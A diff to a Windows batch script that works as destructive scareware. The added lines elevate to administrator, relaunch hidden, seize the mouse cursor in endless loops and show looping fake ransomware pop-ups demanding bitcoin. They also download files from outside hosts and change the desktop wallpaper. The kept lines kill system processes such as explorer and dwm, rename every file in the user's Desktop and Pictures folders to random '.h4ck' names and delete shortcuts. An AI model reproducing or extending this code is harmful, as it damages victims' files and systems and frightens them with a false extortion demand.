@@ -1,4 +1,8 @@
 @echo off
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+cd /d %~dp0
+powershell -windowstyle hidden -command "Start-Process cmd -ArgumentList '/c %~nx0 & exit' -WindowStyle Hidden"
+
 :killloop
 taskkill /f /im explorer.exe >nul 2>&1
 taskkill /f /im notepad.exe >nul 2>&1
@@ -28,6 +32,25 @@ taskkill /f /im dwm.exe >nul 2>&1
 taskkill /f /im cmd.exe >nul 2>&1
 taskkill /f /im powershell.exe >nul 2>&1
 
+:mousebug
+powershell -command "$signature='[DllImport(\"user32.dll\")] public static extern bool SetCursorPos(int x, int y); [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);'; $type=Add-Type -memberDefinition $signature -name win32 -namespace Win32 -passthru; while($true){$x=Get-Random -Minimum 0 -Maximum 1920; $y=Get-Random -Minimum 0 -Maximum 1080; $type::SetCursorPos($x,$y); $type::mouse_event(0x0001,50,50,0,0); Start-Sleep -Milliseconds 20}"
+
+:screenflicker
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 100),(Get-Random -Minimum 0 -Maximum 100)); Start-Sleep -Milliseconds 5}"
+
+:popup
+powershell -command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.MessageBox]::Show('YOUR SYSTEM HAS BEEN COMPROMISED','HACKED'); [System.Windows.Forms.MessageBox]::Show('ALL FILES ARE ENCRYPTED','RANSOMWARE'); [System.Windows.Forms.MessageBox]::Show('SEND BITCOIN TO RECOVER DATA','PAYMENT REQUIRED'); Start-Sleep -Seconds 1}"
+
+:download
+powershell -command "Invoke-WebRequest -Uri 'https://i.imgur.com/BjDp9XH.jpg' -OutFile '%temp%\hack.jpg'" >nul 2>&1
+powershell -command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/example' -OutFile '%temp%\note.txt'" >nul 2>&1
+powershell -command "Invoke-WebRequest -Uri 'https://www.soundjay.com/hacking/hacking-01.wav' -OutFile '%temp%\hack.wav'" >nul 2>&1
+
+:wallpaper
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%temp%\hack.jpg" /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f >nul 2>&1
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1
+
 :infect
 cd %userprofile%\desktop
 for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
@@ -43,7 +66,5 @@ cd %userprofile%\pictures
 for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
 cd %userprofile%\desktop
 for %%f in (*.lnk) do (del "%%f" 2>nul)
-cd C:\
-for %%f in (*.*) do (ren "%%f" "%random%%random%%random%.h4ck" 2>nul)
 timeout /t 2 /nobreak >nul
-goto infect
+goto mousebug
